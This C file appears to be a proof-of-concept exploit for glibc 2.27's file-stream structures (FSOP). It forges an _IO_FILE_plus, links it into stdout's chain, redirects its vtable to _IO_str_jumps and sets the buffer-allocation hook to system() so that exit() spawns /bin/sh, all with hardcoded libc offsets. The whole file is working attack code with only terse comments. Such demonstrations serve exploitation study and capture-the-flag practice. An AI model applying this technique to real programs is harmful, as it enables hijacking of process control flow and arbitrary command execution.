#include <stdio.h>
#include <stdlib.h>

// Testing with libc-2.27
// gcc fsop.c -o fsop

typedef struct {
    int _flags;
    char *_IO_read_ptr;
    char *_IO_read_end;
    char *_IO_read_base;
    char *_IO_write_base;
    char *_IO_write_ptr;
    char *_IO_write_end;
    char *_IO_buf_base;
    char *_IO_buf_end;
    char *_IO_save_base;
    char *_IO_backup_base;
    char *_IO_save_end;
    void *_markers;
    void *_chain;
    int _fileno;
    int _flags2;
    int _old_offset;
    unsigned short _cur_column;
    signed char _vtable_offset;
    char shortbuf[1];
    void *_lock;
    long long _offset;
    void *_codecvt;
    void *_wide_data;
    void *_freeres_list;
    void *_freeres_buf;
    unsigned int __pad5;
    int _mode;
} _IO_FILE;

int main(void)
{
    char *p;
    void **vtable;
    void *libc;
    void **_IO_str_jumps;
    void **_s;
    char fake_IO_FILE_plus[0xf0] = { 0 };

    char sh[] = "/bin/sh";

    libc = (char *)printf - 0x64f00;
    _IO_str_jumps = (char *)libc + 0x3e8360;

    p = stdout;

    // Overwrite chain
    ((_IO_FILE *)p)->_chain = fake_IO_FILE_plus;

    // fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
    ((_IO_FILE *)fake_IO_FILE_plus)->_mode = -1;
    // ((_IO_FILE *)fake_IO_FILE_plus)->_IO_write_base = 0;
    // ((_IO_FILE *)fake_IO_FILE_plus)->_IO_write_ptr  = 1;

    vtable = (void *)&fake_IO_FILE_plus[0xd8];
    _s = (void *)&fake_IO_FILE_plus[0xe0];

    // Set vtable[3] = _IO_str_overflow
    *vtable = _IO_str_jumps + 3 - 3;

    // Set fp->_s._allocate_buffer
    *_s = system;

    // Set new_size
    ((_IO_FILE *)fake_IO_FILE_plus)->_IO_buf_base = 0;
    ((_IO_FILE *)fake_IO_FILE_plus)->_IO_buf_end  = (unsigned long long)(sh - 100) / 2;

    // Set pos >= _IO_blen(fp) + flush_only
    ((_IO_FILE *)fake_IO_FILE_plus)->_IO_write_base = 0;
    ((_IO_FILE *)fake_IO_FILE_plus)->_IO_write_ptr  = ((_IO_FILE *)fake_IO_FILE_plus)->_IO_buf_end + 1;

    // Trigger _IO_flush_all_lockp
    // fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base --> OK
    // --> Call _IO_OVERFLOW(fp, EOF)
    // --> Call vtable[3]
    // --> Call _IO_str_overflow
    exit(0);
}
